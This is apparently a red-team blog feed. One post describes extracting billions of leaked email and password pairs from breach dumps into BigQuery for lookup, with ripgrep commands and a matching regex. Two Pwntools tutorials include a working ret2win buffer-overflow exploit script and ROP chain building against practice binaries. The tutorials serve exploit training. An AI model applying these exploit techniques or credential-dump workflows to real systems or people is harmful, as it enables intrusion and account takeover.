<img alt="FUCK. THIS. SHIT" style="text-align: center; width: 100%" src="https://media.giphy.com/media/kHU8W94VS329y/giphy.gif">
<p>Turns out that as the record count grew into the multiples of billions,
even b-tree indexes weren&rsquo;t going to be enough to maintain a reasonable ETA.
In my previous post, my math for detecting ETAs did not account for the fact that as the database grew,
so too would the time required to create the associations while seeding.</p>
<p>I took a few months off to tend to other projects.
I&rsquo;d come back every so often and just get overwhelmed at the sight of a <code>SELECT</code> here
or a <code>JOIN</code> there.
I eventually asked other red teamers if/what they were doing for password dump recon.
Unanimously they answered, Google Cloud&rsquo;s BigQuery.</p>
<h2 id="act-ii">ACT II</h2>
<p><img src="1.png" alt="gcp panel"></p>
<p>BigQuery, Dataprep, and Storage on GCP were my tools on this journey.
Upon creating my account, I was welcomed with $300-worth of free credits.
This ended up being just enough to upload, parse, and insert the dump data I had previously acquired.
The start of my journey began here: <a href="https://cloud.google.com/bigquery/docs/quickstarts/quickstart-command-line">https://cloud.google.com/bigquery/docs/quickstarts/quickstart-command-line</a></p>
<p>With my account activated, I moved on to preparing my data, pulling out emails and
passwords from dumps using <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rg --no-filename -a -o -f ./email.regex ../collections1-5/ &gt;&gt; all.txt
  <span style="color:#75715e"># -a - reach into binary (non-text) data</span>
  <span style="color:#75715e"># -o - only print matches, not entire lines</span>
  <span style="color:#75715e"># -f [file] - a path to a file containing a regex pattern with which to match</span>
</code></pre></div><p>This nasty piece of regex right here is what <code>ripgrep</code> will match while poring over the data:</p>
<pre tabindex="0"><code class="language-regex" data-lang="regex">(?i)(?:[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)@(?i)(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])[:|;](?:[a-z0-9!\]\[&lt;&gt;@#\(\):$%&amp;\\&quot;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)
</code></pre><p>Next, I needed to turn my extracted data into a CSV file for consumption by BigQuery.
I needed to turn <code>user@domain.com:password</code> into <code>user,domain,password</code>.
You&rsquo;re most welcome to <code>sed | awk | grep | cut</code> your way into the Annals of Leet-dom, but I used
DataPrep.</p>
<p>BigQuery, while technically able to ingest CSV straight from your computer using the CLI client like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bq load --quote <span style="color:#e6db74">&#34;&#34;</span> --allow_jagged_rows --field_delimiter tab --source_format CSV <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dataset_name<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>table_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/all.csv&#34;</span>
</code></pre></div><p>I had an internet hiccup during upload and had to start over. RIP a portion of my $300 budget.
If doing this again, I&rsquo;d upload to Storage instead.
Both BigQuery and Dataprep allow Storage buckets as sources.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gsutil -o GSUtil:parallel_composite_upload_threshold<span style="color:#f92672">=</span>40G cp all.txt <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>
  <span style="color:#75715e"># -o [option] here will allow concurrent uploads</span>
</code></pre></div><p>I popped on over to the Dataprep service and enjoyed the nice walk-through.
When ready to get started, I imported my dataset from Storage and started massaging the data.</p>
<p><img src="./2.png" alt="dataprep filter page"></p>
<p>I was pleasantly surprised when clicking &lsquo;Run Job&rsquo;,
because I noticed the option to export the job results <strong>directly</strong> to BigQuery.
So useful.
My job took around 24 hours to run.</p>
<pre tabindex="0"><code>Stats for passdb
========================================
Bytes:   150057615285
Rows:    3658006353
Unique
  Usernames: 1164102376
  Domain:    27389067
  Password:  887268363
</code></pre><h2 id="using-bigquery-as-my-apis-backend-datastore">Using BigQuery as my API&rsquo;s backend datastore</h2>
<p>A while ago, I created <a href="https://github.com/audibleblink/passdb-backend">https://github.com/audibleblink/passdb-backend</a> to try to handle the parsing,
seeding, and routing of dump data.
I&rsquo;ve since removed all code related to my naive database dalliances.
I&rsquo;ve also retrofitted the existing API code to use BigQuery as the data source.
After creating and scoping a Service Account on the
<a href="https://console.cloud.google.com/apis/credentials">Credential Portal Page</a>,
it was just a matter of exporting the right environment variables (see: project readme) and I was
back to using my existing frontend; the joys of decoupled webapps :)</p>
<p>After starting my API server locally, I can navigate to <a href="https://alexflor.es/passdb-frontend">https://alexflor.es/passdb-frontend</a>
and start querying again as if no grief had ever befallen me!</p>
<p><em>rocking intensifies</em></p>
<p>By the way, if you haven&rsquo;t had the chance to develop a front-end in Svelte.js, I highly recommend
it.</p>
<p><img src="demo.gif" alt="passdb demo"></p>
<blockquote>
<p>The gear in the top right on the live site allows for setting the location of the API server</p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p>I don&rsquo;t regret the learnings, and in fact, if someone had told me from the get-go to use GCP, my
hard-headed ass would probably still have tried to self-host. My main question was how much data
duplication there was. Asked and answered.</p>
<p>It took my butting up against the well-established case of the space-time trade-off to be reminded
that space is cheap, so like, who even cares?</p>
<p><img src="https://media.giphy.com/media/8fyn3ZRrAtuAo/giphy.gif" alt=""></p>
<p>PS: Wait a minute, now the data is parsed and organized, perhaps I can export the BigQuery tables and
self-host after all (<em>sans</em> normalization, but oh well)! Time for an alternate branch!</p>
]]></content>
        </item>
        
        <item>
            <title>Pwntool Tips 3</title>
            <link>https://ctrl.red/posts/2020/01/pwntool-tips-3/</link>
            <pubDate>Sat, 04 Jan 2020 19:13:37 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2020/01/pwntool-tips-3/</guid>
            <description>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary using the elf.search() function. We passed bytes ff e4 in order to find the address of a jmp rsp instruction. As it turns out, we can use also the mnemonic if we pass it through asm() first. This way, we don&amp;rsquo;t have to remember that jmp rsp is ff e4 on amd64 architecture.</description>
            <content type="html"><![CDATA[<p>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary
using the <code>elf.search()</code> function. We passed bytes <code>ff e4</code> in order to find the address of a <code>jmp rsp</code> instruction. As it turns out, we can use also the mnemonic if we pass it through <code>asm()</code> first.
This way, we don&rsquo;t have to remember that <code>jmp rsp</code> is <code>ff e4</code> on amd64 architecture.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#e6db74">&#34;&#34;&#34; From yesterday &#34;&#34;&#34;</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe4</span><span style="color:#e6db74">&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>

<span style="color:#e6db74">&#34;&#34;&#34; Alternate way, with the mnenonic &#34;&#34;&#34;</span>
In [<span style="color:#ae81ff">3</span>]: searcher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>search( asm(<span style="color:#e6db74">&#34;jmp rsp&#34;</span>) )
In [<span style="color:#ae81ff">4</span>]: searcher<span style="color:#f92672">.</span>next()
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">159281</span>


</code></pre></div><h1 id="auto-finding-the-offset-with-cyclic--corefiles">Auto-Finding the Offset with Cyclic &amp; Corefiles</h1>
<p>The <code>cyclic</code> function will generate a deterministic sequence called a
<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn</a>
sequence. Since the pattern is always the same, we can rely on the fact that any subsequence will
also be at the same index. That means we can take the sequence at the fault address and search for
the offset within that sequence. Searching is done with the <code>cyclic_find</code> function.</p>
<p><code>Pwntools</code> also knows how to deal with core dumps.</p>
<p>From the <a href="http://docs.pwntools.com/en/stable/elf/corefile.html#using-corefiles-to-automate-exploitation">Docs</a>:</p>
<blockquote>
<p>Core dumps are extremely useful when writing exploits, even outside of the normal act of debugging things.</p>
</blockquote>
<p>We&rsquo;re going use the first 64-bit challenge from
<a href="https://ropemporium.com/challenge/ret2win.html">ROP Emporium</a>.
The challenges here are specifically geared toward practicing ROP techniques, so they remove most
reversing and bug-hunting barriers and tell you outright that the overflow length for every
challenge is 40. As a former teacher, I approve of this method. We&rsquo;ll use this known-good value of
40 to test with.</p>
<p>To automatically find the offset:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
In [<span style="color:#ae81ff">3</span>]: io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
In [<span style="color:#ae81ff">4</span>]: io<span style="color:#f92672">.</span>recv()
In [<span style="color:#ae81ff">5</span>]: io<span style="color:#f92672">.</span>sendline( cyclic(<span style="color:#ae81ff">128</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
In [<span style="color:#ae81ff">6</span>]: io<span style="color:#f92672">.</span>wait()
[<span style="color:#f92672">*</span>] Process <span style="color:#e6db74">&#39;./ret2win&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> (SIGSEGV) (pid <span style="color:#ae81ff">1108287</span>)

In [<span style="color:#ae81ff">7</span>]: coredump <span style="color:#f92672">=</span> Core(<span style="color:#e6db74">&#34;./core.ret2win.1108287&#34;</span>)
[x] Parsing corefile<span style="color:#f92672">...</span>
    Arch:      amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
    RIP:       <span style="color:#ae81ff">0x400810</span>
    RSP:       <span style="color:#ae81ff">0x7ffcef76b438</span>
    Fault:     <span style="color:#ae81ff">0x6161616161616166</span>

In [<span style="color:#ae81ff">8</span>]: cyclic_find(coredump<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">8</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><p>Here&rsquo;s what a fully automated exploit might look like using what we&rsquo;ve learned from the past 3
posts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overflow</span>(io, data):
    io<span style="color:#f92672">.</span>recv()
    io<span style="color:#f92672">.</span>sendline(data)

exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ret2win&#34;</span>
io  <span style="color:#f92672">=</span> process(exe)

overflow( io, cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>) )
io<span style="color:#f92672">.</span>wait()

elf_file <span style="color:#f92672">=</span> ELF(exe)
offset   <span style="color:#f92672">=</span> cyclic_find( io<span style="color:#f92672">.</span>corefile<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
payload  <span style="color:#f92672">=</span> fit({ offset: elf_file<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>ret2win })

io <span style="color:#f92672">=</span> process(exe)
overflow(io, payload)
success( io<span style="color:#f92672">.</span>recvline() )
</code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248672</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./ret2win&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 1248672<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Parsing corefile...: Done
    Arch:      amd64-64-little
    RIP:       0x400810
    RSP:       0x7ffcf9977c28
    Fault:     0x6161616161616166
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248677</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> b<span style="color:#e6db74">&#34;Thank you! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}\n&#34;</span>
</code></pre></div><p>Check out the <code>cyclic</code> <a href="http://docs.pwntools.com/en/stable/util/cyclic.html">docs here</a></p>
]]></content>
        </item>
        
        <item>
            <title>Pwntool Tips 2</title>
            <link>https://ctrl.red/posts/2020/01/pwntool-tips-2/</link>
            <pubDate>Fri, 03 Jan 2020 13:13:01 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2020/01/pwntool-tips-2/</guid>
            <description>ELF and ROP Modules Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way. Full ELF docs Full ROP docs  ELF fit One of the Class-level members I want to talk about is fit. I&amp;rsquo;ve had to create lines in my exploit code that look like this:
buf_len = 128 pad_len = buf_len - (len(gadgets) + len(mprotect)) payload = gadgets payload += mprotect payload += &amp;#34;A&amp;#34; * pad_len payload += canary payload += &amp;#34;A&amp;#34; * 16 # junk payload += jmprsp fit allows you to be declarative about where each of your exploit components should be in your payload.</description>
            <content type="html"><![CDATA[<h1 id="elf-and-rop-modules">ELF and ROP Modules</h1>
<p>Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way.</p>
<ul>
<li>Full <a href="http://docs.pwntools.com/en/stable/elf/elf.html">ELF docs</a></li>
<li>Full <a href="http://docs.pwntools.com/en/stable/rop/rop.html">ROP docs</a></li>
</ul>
<h2 id="elf">ELF</h2>
<h3 id="fit">fit</h3>
<p>One of the Class-level members I want to talk about is <code>fit</code>. I&rsquo;ve had to create lines in my
exploit code that look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
pad_len <span style="color:#f92672">=</span> buf_len <span style="color:#f92672">-</span> (len(gadgets) <span style="color:#f92672">+</span> len(mprotect))

payload  <span style="color:#f92672">=</span> gadgets
payload <span style="color:#f92672">+=</span> mprotect
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> pad_len
payload <span style="color:#f92672">+=</span> canary
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e"># junk</span>
payload <span style="color:#f92672">+=</span> jmprsp
</code></pre></div><p><code>fit</code> allows you to be declarative about where each of your exploit components should be in your
payload.</p>
<p>The same payload, using <code>fit</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fit({
        <span style="color:#ae81ff">0</span>: gadgets,
        <span style="color:#ae81ff">8</span>: mprotect,
        <span style="color:#ae81ff">128</span>: canary,
        <span style="color:#ae81ff">144</span>: jmprsp
    })
</code></pre></div><p>All padding between the declared sections is inserted for you. Bonus, it uses the same pattern
that <code>cyclic</code> uses, so if your binary crashes during the exploit, the resulting address in the
crash screen of GDB can be inserted into <code>cyclic_find</code> and it will tell you where the cause of the
crash is in your payload. Much like using <code>pattern_create</code> to find an initial buffer length. I&rsquo;ll
go into <code>cyclic</code> in another blog post.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: exp <span style="color:#f92672">=</span> fit({
   <span style="color:#f92672">...</span>:     <span style="color:#ae81ff">4</span>: <span style="color:#e6db74">&#34;ZZZZ&#34;</span>,
   <span style="color:#f92672">...</span>:     <span style="color:#ae81ff">12</span>: <span style="color:#e6db74">&#34;XXXX&#34;</span>
   <span style="color:#f92672">...</span>: })

In [<span style="color:#ae81ff">3</span>]: exp
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74">&#39;aaaaZZZZcaaaXXXX&#39;</span>
</code></pre></div><h3 id="symbols">symbols</h3>
<p><code>symbols</code> will return a <code>dotdict</code> of symbol-to-address mappings. <code>sym</code> is a convenience
alias to <code>symbols</code>. A <code>dotdict</code> is a class within <code>pwntools</code> that allows dotted access to the
underlying python <code>dict</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;pwnable&#34;</span>)
In [<span style="color:#ae81ff">3</span>]: e<span style="color:#f92672">.</span>symbols
Out[<span style="color:#ae81ff">3</span>]:
{<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;__gmon_start__&#39;</span>: <span style="color:#ae81ff">4207552</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;__libc_start_main&#39;</span>: <span style="color:#ae81ff">4207544</span>,
 <span style="color:#f92672">...</span>snip<span style="color:#f92672">...</span>
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;read&#39;</span>: <span style="color:#ae81ff">4198480</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;setvbuf&#39;</span>: <span style="color:#ae81ff">4198512</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;stdout&#39;</span>: <span style="color:#ae81ff">4207640</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;strcmp&#39;</span>: <span style="color:#ae81ff">4198496</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;strlen&#39;</span>: <span style="color:#ae81ff">4198444</span>}

In [<span style="color:#ae81ff">4</span>]: e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">4198480</span>
</code></pre></div><h3 id="search">search</h3>
<p><code>search</code> takes a sequence of bytes and returns an iterator of possible matches. Handy if you want
to get the location of say &ldquo;/bin/sh&rdquo; inside of <code>libc</code>, or even just to find specific instructions
you might want to use in your payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/libc.so.6&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">1618340</span>
</code></pre></div><p>Finding a JMP RSP (<code>ff e4</code>) instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe4</span><span style="color:#e6db74">&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
</code></pre></div><h2 id="rop">ROP</h2>
<p>The ROP module facilitates creating ROP chains by creating a python-style call API of sorts for
calling symbols located in the binary. We&rsquo;ll use <code>mprotect</code> for our example.</p>
<p>From <code>man 3 mprotect</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">NAME
       mprotect — set protection of memory mapping

SYNOPSIS
       #include &lt;sys/mman.h&gt;
       int mprotect(void *addr, size_t len, int prot);
</code></pre></div><h3 id="call">call</h3>
<p>Call will allow you to call the symbol you designate as the first param, and take subsequent
arguments to the callee as a list. The function doesn&rsquo;t return anything, but modifies the
instance of the ROP class. This allows for you to continue to chain more calls together. Once
you&rsquo;re ready, you can <code>bytes(rop)</code> or <code>rop.chain()</code> to get the resulting payload. As a convenience,
symbols are also directly callable from the <code>ROP</code> instance.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
In [<span style="color:#ae81ff">3</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74">&#39;./haxme&#39;</span>)

In [<span style="color:#ae81ff">4</span>]: rop<span style="color:#f92672">.</span>dump()
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#e6db74">&#39;&#39;</span>

In [<span style="color:#ae81ff">5</span>]: rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;mprotect&#39;</span>, [<span style="color:#ae81ff">0x12345678</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x7</span>])

In [<span style="color:#ae81ff">6</span>]: print(rop<span style="color:#f92672">.</span>dump())
<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret

In [<span style="color:#ae81ff">7</span>]: rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1234</span>, <span style="color:#ae81ff">0x100</span>)

In [<span style="color:#ae81ff">8</span>]: print(rop<span style="color:#f92672">.</span>dump())
<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
<span style="color:#ae81ff">0x0028</span>:         <span style="color:#ae81ff">0x43bf50</span> mprotect
<span style="color:#75715e">####</span>
<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0038</span>:            <span style="color:#ae81ff">0x100</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
<span style="color:#ae81ff">0x0040</span>:           <span style="color:#ae81ff">0x1234</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4660</span>
<span style="color:#ae81ff">0x0048</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0050</span>:              <span style="color:#ae81ff">0x0</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">0x0058</span>:         <span style="color:#ae81ff">0x43b3e0</span> read
</code></pre></div><h3 id="gadgets-and-find_gadget"><code>gadgets</code> and <code>find_gadget</code></h3>
<p>Upon instantiation of a ROP object, you may see log output mention something like &ldquo;Loading
Gadgets&rdquo;. It&rsquo;s self explanatory. I do want to mention that <code>pwntools</code> gadget finder isn&rsquo;t as
robust as something like
<a href="https://github.com/sashs/Ropper">ropper</a>.
That said, it&rsquo;s still a very helpful and useful function. <code>gadgets</code> contains your dict of gadget
objects and <code>find_gadget</code> is simply a convenience methods for searching the <code>gadgets</code> dict.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74">&#39;./haxme&#39;</span>)

In [<span style="color:#ae81ff">3</span>]: len(rop<span style="color:#f92672">.</span>gadgets)
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">109</span>

In [<span style="color:#ae81ff">4</span>]: gdt <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;pop rsi&#34;</span>])
In [<span style="color:#ae81ff">5</span>]: gdt
Out[<span style="color:#ae81ff">5</span>]: Gadget(<span style="color:#ae81ff">0x4006ab</span>, [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop r15&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop rbp&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;ret&#39;</span>], [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;rsi&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;r15&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;rbp&#39;</span>], <span style="color:#ae81ff">0x10</span>)

In [<span style="color:#ae81ff">6</span>]: gdt<span style="color:#f92672">.</span>address
Out[<span style="color:#ae81ff">6</span>]: <span style="color:#ae81ff">4196011</span>L
</code></pre></div><h3 id="srop">SROP</h3>
<p>When attempting to call something like <code>mprotect</code> in a binary that doesn&rsquo;t explicitly have a symbol
